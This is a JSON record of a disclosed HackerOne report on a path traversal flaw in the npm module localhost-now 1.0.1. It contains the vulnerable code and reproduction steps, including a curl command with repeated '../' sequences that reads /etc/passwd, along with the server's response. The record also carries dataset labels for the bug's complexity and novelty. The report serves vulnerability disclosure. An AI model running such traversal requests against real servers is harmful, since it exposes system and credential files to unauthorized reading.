{
  "reported_to": "Node.js third-party modules",
  "reported_by": "bl4de ",
  "title": "[localhost-now] Path Traversal allows to read content of arbitrary file",
  "content": "\nHi Guys,\nThere is Path Traversal in localhost-now module.\nIt allows to read content of arbitrary files on the remote server.\nModule\nlocalhost-now\nThis is a general file server made by nodejs. It will be easy for you to access the files on the server through the browser.\nhttps://www.npmjs.com/package/localhost-now\nversion: 1.0.1\nStats\n0 downloads in the last day\n24 downloads in the last week\n89 downloads in the last month\n~1100 estimated downloads per year\nDescription\nLack of file path sanitization causes that any file on the server might be read by malicious user:\nCode 276 Bytes\n1// node_modules/localhost-now/lib/app.js, line 10:\n2    var url = req.url;\n3\n4    if (url.indexOf('?') != -1) {\n5        url = url.split('?')[0];\n6    }\n7\n8    var file = url === \"/\" ? \"/index.html\" : url;\n9\n10    fs.readFile(path.normalize(process.cwd()) + file, function(err, data) {\n11\nPath is read directly from request and used to read content of file without checking against Path Traversal attempt.\nSteps To Reproduce:\ninstall localhost-now:\nCode 27 Bytes\n1$ npm install localhost-now\nrun localhost-now in direcotry of your choice:\nCode 112 Bytes\n1me:~/playground/hackerone/Node$ ./node_modules/localhost-now/bin/localhost \n2Web Server started on localhost:1337\nexecute following curl command (adjust number of ../ to reflect your system):\nCode 73 Bytes\n1$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd\nsee result:\nCode 423 Bytes\n1*   Trying ::1...\n2* Connected to localhost (::1) port 1337 (#0)\n3> GET /../../../../../etc/passwd HTTP/1.1\n4> Host: localhost:1337\n5> User-Agent: curl/7.47.0\n6> Accept: */*\n7> \n8< HTTP/1.1 200 OK\n9< content-type: text/\n10< Date: Tue, 06 Feb 2018 14:06:55 GMT\n11< Connection: keep-alive\n12< Content-Length: 2615\n13< \n14root:x:0:0:root:/root:/bin/bash\n15daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n16bin:x:2:2:bin:/bin:/usr/sbin/nologin\n17(...)\nSupporting Material/References:\nUbuntu 16.04 LTS\nChromium 66.0.3333.0 (Developer Build) (64-bit)\nNode.js version: v8.9.4 LTS\nnpm version: 5.6.0\ncurl 7.47.0\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\nRegards,\nRafal 'bl4de' Janicki\nImpact\nThis vulnerability might be used to read content of any file on the server where module is run\n\n",
  "severity": [
    8.6,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1519698120,
  "report_url": "https://hackerone.com/reports/312889",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install localhost-now: npm install localhost-now"
    ],
    [
      2,
      "Run the server: ./node_modules/localhost-now/bin/localhost"
    ],
    [
      3,
      "Exploit the vulnerability using curl: curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd"
    ]
  ],
  "vuln_description": "The vulnerability is a Path Traversal in the localhost-now module, allowing an attacker to read arbitrary files on the server due to lack of file path sanitization. The module directly uses the URL from the request to read files without checking for Path Traversal attempts.",
  "reason": "The vulnerability is straightforward to exploit as it involves a common security flaw (Path Traversal) and requires no complex interactions or state manipulations. The attack is direct and leverages a well-known vulnerability pattern.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}